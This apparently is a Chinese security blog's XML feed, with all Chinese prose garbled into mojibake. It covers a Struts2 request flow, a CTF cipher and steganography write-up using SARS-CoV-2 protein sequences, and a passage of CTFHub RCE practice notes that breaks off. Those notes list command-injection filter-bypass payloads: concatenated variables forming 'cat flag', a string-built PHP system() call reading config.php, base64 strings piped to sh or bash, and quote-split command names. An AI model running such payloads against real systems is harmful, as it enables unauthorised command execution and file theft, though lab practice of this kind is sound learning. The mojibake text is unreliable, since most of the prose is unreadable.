alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="Struts2å¤„ç†æµç¨‹"><a href="#Struts2å¤„ç†æµç¨‹" class="headerlink" title="Struts2å¤„ç†æµç¨‹"></a>Struts2å¤„ç†æµç¨‹</h2><p>ï¼ˆ1ï¼‰ç”¨æˆ·åœ¨å®¢æˆ·ç«¯å‘å‡ºHTTPè¯·æ±‚</p><p>ï¼ˆ2ï¼‰ç„¶åè¯·æ±‚è¢«æ ¸å¿ƒè¿‡æ»¤å™¨StrutsPrepareAndExecuteFilteræ‹¦æˆª</p><p>ï¼ˆ3ï¼‰æ ¸å¿ƒè¿‡æ»¤å™¨å°†è¯·æ±‚è½¬å‘åˆ°Actionæ˜ å°„å™¨ï¼ŒActionæ˜ å°„å™¨è´Ÿè´£è¯†åˆ«å½“å‰çš„è¯·æ±‚æ˜¯å¦éœ€è¦äº¤ç”±Struts2å¤„ç†ã€‚</p><p>ï¼ˆ4ï¼‰Actionæ˜ å°„å™¨è¿”å›éœ€è¦struts2å¤„ç†çš„ä¿¡æ¯ï¼ŒStrutsPrepareAndExecuteFilterä¼šåˆ›å»ºä¸€ä¸ªActionä»£ç†</p><p>ï¼ˆ5ï¼‰Actionä»£ç†å¹¶ä¸çŸ¥é“æ‰§è¡Œå“ªä¸€ä¸ªActionï¼Œå®ƒä¼šå‘é…ç½®ç®¡ç†å™¨è¯¢é—®è°ƒç”¨å“ªä¸€ä¸ªActionï¼Œé…ç½®ç®¡ç†å™¨ä¼šä»struts.xmlè¯»å–æˆ‘ä»¬é…ç½®çš„Actionä¿¡æ¯ã€‚</p><p>ï¼ˆ6ï¼‰Actionä»£ç†åˆ›å»ºç›¸å…³è¯·æ±‚çš„Actionå¯¹è±¡ï¼Œè°ƒç”¨ç›¸å…³çš„æ–¹æ³•ä¹‹å‰ï¼Œstruts2çš„ä¸€ç³»åˆ—æ‹¦æˆªå™¨ä¼šå¸®æˆ‘ä»¬åšä¸€äº›æ“ä½œï¼Œä¾‹å¦‚è·å–è¯·æ±‚å‚æ•°ç­‰ã€‚</p><p>ï¼ˆ7ï¼‰ç„¶åè°ƒç”¨executeæ–¹æ³•æ ¹æ®è¿”å›çš„å­—ç¬¦ä¸²å»åŒ¹é…ç›¸åº”çš„é¡µé¢ï¼Œ</p><p>ï¼ˆ8ï¼‰é¡µé¢å¯ä»¥è·å–ä¸€äº›é¡µé¢æ¨¡æ¿ï¼Œç„¶åç”Ÿæˆæœ€ç»ˆé¡µé¢ï¼Œå†å€’åºçš„æ‰§è¡Œæ‹¦æˆªå™¨çš„åç»­æ“ä½œ</p><p>ï¼ˆ9ï¼‰æœ€åç”ŸæˆHTTPå“åº”å†…å®¹</p><p><img src="https://img-blog.csdnimg.cn/20210319201448283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    
    <categories>
      
      <category>ç¼–ç¨‹å¼€å‘</category>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Struts2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ˜¥ç§‹æ¯æ–°å¹´æ¬¢ä¹èµ›</title>
    <link href="/2021/02/09/%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/"/>
    <url>/2021/02/09/%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p>æ‘˜è¦ï¼šè®°æ˜¥ç§‹æ¯æ–°å¹´æ¬¢ä¹èµ›ä¸¤é“é¢˜ç›®å¤ç°</p> <a id="more"></a><h2 id="åäºŒå®«çš„æŒ‘è¡…"><a href="#åäºŒå®«çš„æŒ‘è¡…" class="headerlink" title="åäºŒå®«çš„æŒ‘è¡…"></a>åäºŒå®«çš„æŒ‘è¡…</h2><p>ä¸‹è½½é™„ä»¶ï¼Œè§£å‹ï¼Œå¾—åˆ°Twelve_palaces_of_serial_killers.pngå›¾ç‰‡<br><img src="https://img-blog.csdnimg.cn/2021020118270295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æå–å›¾ç‰‡å†…å®¹ä¸ºï¼Œå°†å¯†æ–‡æ”¾åœ¨excelè¡¨æ ¼ä¸­,ç¬¬ä¸€ä¸ªå­—ç¬¦^ï¼Œéšåå†å‘ä¸‹ç§»åŠ¨ä¸€æ ¼ï¼Œåœ¨å‘å·¦ç§»åŠ¨ä¸¤ä¸ªï¼Œå¾—åˆ°ç¬¬äºŒä¸ªå­—ç¬¦&gt;ï¼Œä»¥æ­¤ç±»æ¨ã€‚<br><img src="https://img-blog.csdnimg.cn/2021020118272653.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç»è¿‡é‡æ–°æ’åˆ—ï¼Œå¾—åˆ°æ–°çš„å¯†æ–‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">^&gt;%..@3*&amp;<span class="hljs-comment">#(#0+@#+</span><br>.@*53)8@+@$+&amp;!%&gt;^<br>&amp;.@36%&amp;&amp;4@?<span class="hljs-comment">#&lt;!=.*</span><br>9@=(<span class="hljs-comment">#=@79@&lt;~)8%=^</span><br>=0.*/611811)*&gt;@<span class="hljs-comment">#0</span><br>0%8$+@-<span class="hljs-variable">$1</span>?*53!?7-<br>+(^(*==$<span class="hljs-variable">$5</span>*=+<span class="hljs-comment">#==^</span><br>4&amp;~<span class="hljs-variable">$7</span>%6%.&amp;?<span class="hljs-comment">#5)%51</span><br>!)<span class="hljs-comment">#?$&lt;&lt;^()8!?7%&lt;@</span><br></code></pre></td></tr></table></figure><p>åœ¨AZdecryptè½¯ä»¶è¿è¡Œåï¼Œå¾—åˆ°ä¸€æ®µè‹±æ–‡<br><img src="https://img-blog.csdnimg.cn/20210201185433621.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>çŒœæµ‹flagä¸ºflag{WUUHUU TAKE OFF}ï¼Œæäº¤åå‘ç°ä¸å¯¹ã€‚ç»è¿‡å°è¯•åï¼Œå‘ç°å»æ‰ç©ºæ ¼æäº¤æˆåŠŸã€‚æœ€ç»ˆ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">flag&#123;WUUHUUTAKEOFF&#125;<br></code></pre></td></tr></table></figure><h2 id="2019-nCoV"><a href="#2019-nCoV" class="headerlink" title="2019-nCoV"></a>2019-nCoV</h2><p>é¢˜ç›®æè¿°ï¼šå¯¹nCoväº†è§£å¤šå°‘ï¼Ÿ</p><p>ä¸€ä¸ªé¢˜ç›®é™„ä»¶å’Œä¸€ä¸ªhinté™„ä»¶ï¼Œhintå†…å®¹ä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">NB2HI4B2F4XXO53XFZWWK4TSPFRGS3ZOMNXW2LTDNYXWE3DPM4XVGQKSKMWUG32WFUZC2Z3FNZXW22LDFVQW4YLMPFZWS4ZONB2G23AKNB2HI4DTHIXS653XO4XG4Y3CNEXG43DNFZXGS2BOM5XXML3POJTGM2LOMRSXELYKNB2HI4B2F4XXO53XFZWWK4TSPFRGS3ZOMNXW2LTDNYXWE3DPM4XWG33SN5XGC5TJOJ2XGLLJNZ2HE33EOVRXI2LPNYXGQ5DNNQFAUUDMMVQXGZJANZXXI2LDMUQFI2DFEBWGC4THMVZXIIDTORZHKY3UOVZGC3BAOBZG65DFNFXCAIAKORUGKIDQMFZXG53POJSCA2LTEB2GQZJAEBWWINJINF2CO4ZAM5SW4ZJAONSXC5LFNZRWKKJAMFXGIIDEN4QG433UEBWGK5BAORUGKIHCQCMFY3XCQCMSA2LOEBWWINJIFE======<br></code></pre></td></tr></table></figure><p>Base32è§£ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://www.merrybio.com.cn/blog/SARS-CoV-2-genomic-analysis.html<br>https://www.ncbi.nlm.nih.gov/orffinder/<br>http://www.merrybio.com.cn/blog/coronavirus-introduction.html<br><br>Please notice The largest structural protein<br>the password is the md5(it<span class="hljs-string">&#x27;s gene sequence) and do not let the â€˜\nâ€™ in md5()</span><br></code></pre></td></tr></table></figure><p>ä¸‰ä¸ªç½‘å€ï¼Œä¸¤ç¯‡ä»‹ç»ç—…æ¯’çš„æ–‡ç« å’Œä¸€ä¸ªåŸºå› æŸ¥è¯¢ç½‘ç«™ã€‚åé¢çš„è‹±æ–‡å¥å­æ„æ€æ˜¯è¯·æ³¨æ„æœ€å¤§çš„ç»“æ„è›‹ç™½ï¼Œpasswordæ˜¯md5ï¼ˆå®ƒçš„åŸºå› åºåˆ—ï¼‰ã€‚</p><p>åœ¨æ–‡ç« ä¸­æœç´¢å…³é”®å­—<code>æœ€å¤§çš„ç»“æ„è›‹ç™½</code>ï¼Œæ˜¯åˆºçªè›‹ç™½ã€‚<br><img src="https://img-blog.csdnimg.cn/20210201162644442.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>hintä¸­æ‰€ç»™çš„<a href="https://www.ncbi.nlm.nih.gov/orffinder/">æŸ¥è¯¢</a>ç½‘ç«™ï¼Œè¦æ±‚ä»¥FASTAæ ¼å¼è¾“å…¥ç™»å½•å·ã€giæˆ–æ ¸è‹·é…¸åºåˆ—ã€‚åœ¨æ–‡æœ¬åŒºåŸŸä¸­è¾“å…¥æŸ¥è¯¢åºåˆ—<br><img src="https://img-blog.csdnimg.cn/20210201165625242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ–‡ç« ä¸­æŸ¥æ‰¾ç™»å½•å·<code>MN908947</code><br><img src="https://img-blog.csdnimg.cn/20210201163419968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åœ¨æ–‡ç« ä¸­æ‰¾åˆ°èŒƒå›´ä¸º<code>21536-25384</code><br><img src="https://img-blog.csdnimg.cn/20210201163827698.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¾“å…¥ç™»é™†å·å’ŒèŒƒå›´ï¼Œå¾—åˆ°åŸºå› åºåˆ—<br><img src="https://img-blog.csdnimg.cn/20210201165858431.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¤åˆ¶åŸºå› åºåˆ—</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">MFLLTTKRTMFVFLVLLPLVSSQCVNLTTRTQLPPAYTNSFTRGVYYPDKVFRSSVLHSTQDLFLPFFSNVTWFHAIHVSGTNGTKRFDNPVLPFNDGVYFASTEKSNIIRGWIFGTTLDSKTQSLLIVNNATNVVIKVCEFQFCNDPFLGVYYHKNNKSWMESEFRVYSSANNCTFEYVSQPFLMDLEGKQGNFKNLREFVFKNIDGYFKIYSKHTPINLVRDLPQGFSALEPLVDLPIGINITRFQTLLALHRSYLTPGDSSSGWTAGAAAYYVGYLQPRTFLLKYNENGTITDAVDCALDPLSETKCTLKSFTVEKGIYQTSNFRVQPTESIVRFPNITNLCPFGEVFNATRFASVYAWNRKRISNCVADYSVLYNSASFSTFKCYGVSPTKLNDLCFTNVYADSFVIRGDEVRQIAPGQTGKIADYNYKLPDDFTGCVIAWNSNNLDSKVGGNYNYLYRLFRKSNLKPFERDISTEIYQAGSTPCNGVEGFNCYFPLQSYGFQPTNGVGYQPYRVVVLSFELLHAPATVCGPKKSTNLVKNKCVNFNFNGLTGTGVLTESNKKFLPFQQFGRDIADTTDAVRDPQTLEILDITPCSFGGVSVITPGTNTSNQVAVLYQDVNCTEVPVAIHADQLTPTWRVYSTGSNVFQTRAGCLIGAEHVNNSYECDIPIGAGICASYQTQTNSPRRARSVASQSIIAYTMSLGAENSVAYSNNSIAIPTNFTISVTTEILPVSMTKTSVDCTMYICGDSTECSNLLLQYGSFCTQLNRALTGIAVEQDKNTQEVFAQVKQIYKTPPIKDFGGFNFSQILPDPSKPSKRSFIEDLLFNKVTLADAGFIKQYGDCLGDIAARDLICAQKFNGLTVLPPLLTDEMIAQYTSALLAGTITSGWTFGAGAALQIPFAMQMAYRFNGIGVTQNVLYENQKLIANQFNSAIGKIQDSLSSTASALGKLQDVVNQNAQALNTLVKQLSSNFGAISSVLNDILSRLDKVEAEVQIDRLITGRLQSLQTYVTQQLIRAAEIRASANLAATKMSECVLGQSKRVDFCGKGYHLMSFPQSAPHGVVFLHVTYVPAQEKNFTTAPAICHDGKAHFPREGVFVSNGTHWFVTQRNFYEPQIITTDNTFVSGNCDVVIGIVNNTVYDPLQPELDSFKEELDKYFKNHTSPDVDLGDISGINASVVNIQKEIDRLNEVAKNLNESLIDLQELGKYEQYIKWPWYIWLGFIAGLIAIVMVTIMLCCMTSCCSCLKGCCSCGSCCKFDEDDSEPVLKGVKLHYT<br></code></pre></td></tr></table></figure><p>md5åçš„å€¼ä¸ºpassword</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">98eb1b1760bcc837934c8695a1cee923<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨MP3Stegogå·¥å…·</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">decode -X -P <span class="hljs-number">98</span>eb1b1760bcc837934c8695a1cee923 cov.mp3<br></code></pre></td></tr></table></figure><p>å¾—åˆ°å‹ç¼©åŒ…è§£å‹å¯†ç <br><img src="https://img-blog.csdnimg.cn/20210201172036562.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è§£å‹å‹ç¼©åŒ…ï¼Œæœ‰ä¸€ä¸ªhint2æ–‡æ¡£</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">796f75206d7573742070617920617474656e74696f6e20746f204e2070726f7465696e202c486f7720646f20746861742067657420696e746f2074686520766972616c206361707369643f0a646f20796f75206b6e6f772073746567686964653f0a7468652070617373776f726420697320656e637279707420627920566967656ec3a87265204369706865720a74686520736372656374206b65792069732054686520746f702032302063686172616374657273207769746820746865206d6f7374206f6363757272656e6365732061726520636f756e7465642b434f4d424154<br></code></pre></td></tr></table></figure><p>base16è§£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">you must pay attention to N protein ,How <span class="hljs-keyword">do</span> that get into the viral capsid?<br><span class="hljs-keyword">do</span> you know steghide?<br>the password is encrypt by VigenÃ¨re Cipher<br>the screct key is The top <span class="hljs-number">20</span> characters with the most occurrences are counted+COMBAT<br></code></pre></td></tr></table></figure><p>hint2æç¤ºï¼Œæ³¨æ„Nè›‹ç™½çš„è¿›å…¥æ–¹å¼ï¼Œsteghideæ˜¯å›¾ç‰‡éšå†™å·¥å…·ï¼Œpasswordç»è¿‡VigenÃ¨reåŠ å¯†ï¼Œç„¶åVigenÃ¨reéœ€è¦çš„keyæ˜¯å‡ºç°æ¬¡æ•°æœ€å¤šçš„å‰20ä¸ªå­—ç¬¦+<code>COMBAT</code></p><p>Nè›‹ç™½ç»“åˆMè›‹ç™½å’ŒEè›‹ç™½ï¼Œè¿›å…¥ç—…æ¯’è¡£å£³å†…<br><img src="https://img-blog.csdnimg.cn/20210201173231449.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>NMEä¸‰ä¸ªåŸºå› èŒƒå›´ä¸ºåˆ†åˆ«ä¸º28274-29533ã€27202-27387ã€26523-27191<br><img src="https://img-blog.csdnimg.cn/20210201173601783.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¸‰ä¸ªè›‹ç™½çš„åŸºå› åºåˆ—</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">NåŸºå› <br>MSDNGPQNQRNAPRITFGGPSDSTGSNQNGERSGARSKQRRPQGLPNNTA<br>SWFTALTQHGKEDLKFPRGQGVPINTNSSPDDQIGYYRRATRRIRGGDGK<br>MKDLSPRWYFYYLGTGPEAGLPYGANKDGIIWVATEGALNTPKDHIGTRN<br>PANNAAIVLQLPQGTTLPKGFYAEGSRGGSQASSRSSSRSRNSSRNSTPG<br>SSRGTSPARMAGNGGDAALALLLLDRLNQLESKMSGKGQQQQGQTVTKKS<br>AAEASKKPRQKRTATKAYNVTQAFGRRGPEQTQGNFGDQELIRQGTDYKH<br>WPQIAQFAPSASAFFGMSRIGMEVTPSGTWLTYTGAIKLDDKDPNFKDQV<br>ILLNKHIDAYKTFPPTEPKKDKKKKADETQALPQRQKKQQTVTLLPAADL<br>DDFSKQLQQSMSSADSTQA<br>MåŸºå› <br>MFHLVDFQVTIAEILLIIMRTFKVSIWNLDYIINLIIKNLSKSLTENKYS<br>QLDEEQPMEID<br>EåŸºå› <br>MADSNGTITVEELKKLLEQWNLVIGFLFLTWICLLQFAYANRNRFLYIIK<br>LIFLWLLWPVTLACFVLAAVYRINWITGGIAIAMACLVGLMWLSYFIASF<br>RLFARTRSMWSFNPETNILLNVPLHGTILTRPLLESELVIGAVILRGHLR<br>IAGHHLGRCDIKDLPKEITVATSRTLSYYKLGASQRVAGDSGFAAYSRYR<br>IGNYKLNTDHSSSSDNIALLVQ<br></code></pre></td></tr></table></figure><p><a href="http://www.aihanyu.org/cncorpus/CpsTongji.aspx">åœ¨çº¿å­—é¢‘åˆ†æ</a>ï¼Œç»Ÿè®¡å‰20ä¸ªé¢‘ç‡æœ€é«˜çš„å­—ç¬¦ã€‚<br><img src="https://img-blog.csdnimg.cn/20210201174426117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æœ‰äº›å­—ç¬¦çš„é¢‘æ¬¡ç›¸åŒï¼Œå¯ä»¥è°ƒæ¢é¡ºåºï¼Œå†ç»“å°¾åŠ ä¸Šhint2é‡Œé¢ç»™çš„COMBATï¼Œæœ€ç»ˆç»´å‰å°¼äºšå¯†ç çš„keyä¸ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">LGASTRIQKNDPFEVYMWHCCOMBAT<br></code></pre></td></tr></table></figure><p>ä¸Šé¢æåˆ°çš„passwordåœ¨é™„ä»¶pass.wavä¸­ï¼Œ<a href="https://sourceforge.net/projects/silenteye/">SilentEye</a>å·¥å…·è¿›è¡Œè§£å¯†ï¼Œå¾—åˆ°å¯†æ–‡<code>priebeijoarkjpxmdkucxwdus</code>ã€‚<img src="https://img-blog.csdnimg.cn/20210201175709390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç»´å‰å°¼äºšè§£å¯†ï¼Œå¾—åˆ°<code>eliminatenovelcoronavirts</code><br><img src="https://img-blog.csdnimg.cn/20210201175947417.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä½¿ç”¨steghideæå–CoV-1.jpgéšè—æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">steghide extract -sf CoV-1.jpg -p eliminatenovelcoronavirts<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210201181921964.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>æ¯”èµ›å¤ç°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFHub-Web-RCEç»ƒä¹ </title>
    <link href="/2021/01/16/CTFHub-Web-RCE%E7%BB%83%E4%B9%A0/"/>
    <url>/2021/01/16/CTFHub-Web-RCE%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>æ‘˜è¦ï¼šCTFHubé¶åœºé€šå…³ï¼ˆå››ï¼‰</p> <a id="more"></a><h1 id="ä»€ä¹ˆæ˜¯RCE"><a href="#ä»€ä¹ˆæ˜¯RCE" class="headerlink" title="ä»€ä¹ˆæ˜¯RCE"></a>ä»€ä¹ˆæ˜¯RCE</h1><p>RCEè‹±æ–‡å…¨ç§°ï¼šremote command/code execute<br>åˆ†ä¸ºè¿œç¨‹å‘½ä»¤æ‰§è¡Œå’Œè¿œç¨‹ä»£ç æ‰§è¡Œ<br>| åˆ†ç±»         | è¯´æ˜                       | å‡½æ•° |<br>| â€”â€”â€”â€” | â€”â€”â€”â€”â€”â€”â€”â€”â€“ | â€”- |<br>| è¿œç¨‹å‘½ä»¤æ‰§è¡Œ | ç›´æ¥è°ƒç”¨æ“ä½œç³»ç»Ÿå‘½ä»¤       | ping |<br>| è¿œç¨‹ä»£ç æ‰§è¡Œ | é æ‰§è¡Œä»£ç è°ƒç”¨æ“ä½œç³»ç»Ÿå‘½ä»¤ | eval |</p><h1 id="ç®¡é“ç¬¦"><a href="#ç®¡é“ç¬¦" class="headerlink" title="ç®¡é“ç¬¦"></a>ç®¡é“ç¬¦</h1><h2 id="Windowsç®¡é“ç¬¦"><a href="#Windowsç®¡é“ç¬¦" class="headerlink" title="Windowsç®¡é“ç¬¦"></a>Windowsç®¡é“ç¬¦</h2><table><thead><tr><th>ç®¡é“ç¬¦</th><th>æè¿°</th></tr></thead><tbody><tr><td>`</td><td>`</td></tr><tr><td>`</td><td></td></tr><tr><td><code>&amp;</code></td><td>ä¸¤æ¡å‘½ä»¤éƒ½æ‰§è¡Œï¼Œå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥å¯çœŸå¯</td></tr><tr><td><code>&amp;&amp;</code></td><td>å¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œä¹Ÿä¸æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥ä¸ºçœŸåˆ™ä¸¤æ¡å‘½ä»¤éƒ½æ‰§è¡Œï¼Œå‰é¢çš„è¯­å¥åªèƒ½ä¸ºçœŸã€‚</td></tr></tbody></table><h2 id="Linuxçš„ç®¡é“ç¬¦"><a href="#Linuxçš„ç®¡é“ç¬¦" class="headerlink" title="Linuxçš„ç®¡é“ç¬¦"></a>Linuxçš„ç®¡é“ç¬¦</h2><table><thead><tr><th>ç®¡é“ç¬¦</th><th>æè¿°</th></tr></thead><tbody><tr><td><code>;</code></td><td>æ‰§è¡Œå®Œå‰é¢çš„è¯­å¥å†æ‰§è¡Œåé¢çš„è¯­å¥ã€‚</td></tr><tr><td>`</td><td>`</td></tr><tr><td>`</td><td></td></tr><tr><td><code>&amp;</code></td><td>ä¸¤æ¡å‘½ä»¤éƒ½æ‰§è¡Œï¼Œå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™æ‰§è¡Œæ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥å¯çœŸå¯å‡ã€‚</td></tr><tr><td><code>&amp;&amp;</code></td><td>å¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œä¹Ÿä¸æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥ä¸ºçœŸåˆ™ä¸¤æ¡å‘½ä»¤éƒ½æ‰§è¡Œï¼Œå‰é¢çš„è¯­å¥åªèƒ½ä¸ºçœŸã€‚</td></tr></tbody></table><h1 id="ç»•è¿‡æ–¹æ³•"><a href="#ç»•è¿‡æ–¹æ³•" class="headerlink" title="ç»•è¿‡æ–¹æ³•"></a>ç»•è¿‡æ–¹æ³•</h1><p>ã€€1.æ‹¼æ¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">a=c;b=at;c=fl;d=ag;$a<span class="hljs-variable">$b</span> $c<span class="hljs-variable">$d</span><br>?c=<span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;sys&#x27;</span>;<span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;tem&#x27;</span>;<span class="hljs-variable">$d</span>=<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>;<span class="hljs-variable">$d</span>(<span class="hljs-string">&#x27;cat config.php&#x27;</span>);<br></code></pre></td></tr></table></figure><p>ã€€2.ç¼–ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Y2F0IGZsYWc=&quot;</span>|base64 -d<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Y2F0IGZsYWc=&quot;</span>|base64 -d|sh<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Y2F0IGZsYWc=&quot;</span>|base64 -d|bash<br></code></pre></td></tr></table></figure><p>ã€€3.å•å¼•å·ï¼ŒåŒå¼•å·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ca<span class="hljs-string">&#x27;&#x27;</span>t flag<br>ca<span class="hljs-string">&quot;&quot;</span>t 